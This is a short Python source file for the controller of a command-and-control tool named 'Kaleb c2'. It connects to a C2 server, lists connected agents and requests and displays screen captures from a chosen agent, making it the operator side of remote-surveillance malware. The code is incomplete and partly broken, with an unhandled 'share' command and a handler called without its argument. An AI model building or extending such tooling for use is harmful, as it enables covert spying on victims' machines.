import sys

import cv2

import client
import message
from vuls import *
import argparse

parser = argparse.ArgumentParser(description='Kaleb c2 Controller.')
parser.add_argument('command', choices=['get-agents', 'share', 'get-screen'],
                    help='command to perform')
parser.add_argument('agent_name', help="for share command")  # todo: what if i choose get-agents

parser.add_argument('--server', default='localhost',
                    help='Kaleb c2 server address')

parser.add_argument('--port', type=int, default=SERVER_PORT,
                    help='Kaleb c2 server port')

args = parser.parse_args()


class Controller(client.Client):
    def __init__(self):
        super().__init__("controller")

    def do(self, cmd):
        match cmd:
            case "get-agents":
                self.do_get_agents()
            case "get-screen":
                self.do_get_screen()
            case "frame":
                self.handle_frame_response()
            case _:
                print("error")

    def do_get_screen(self):
        msg = message.Share(args.agent_name)
        self.my_socket.sendall((msg.pack()))

    def do_get_agents(self):
        self.send(message.GetAgents())
        response = message.recv(self.my_socket)
        print(response.agents)

    def handle_frame_response(self, response):
        frame = response.frame
        frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
        cv2.imshow("hello", frame)
        cv2.waitKey(1)


def main():
    c = Controller()
    c.connect(args.server, args.port)

    c.do(args.command)


if __name__ == '__main__':
    main()
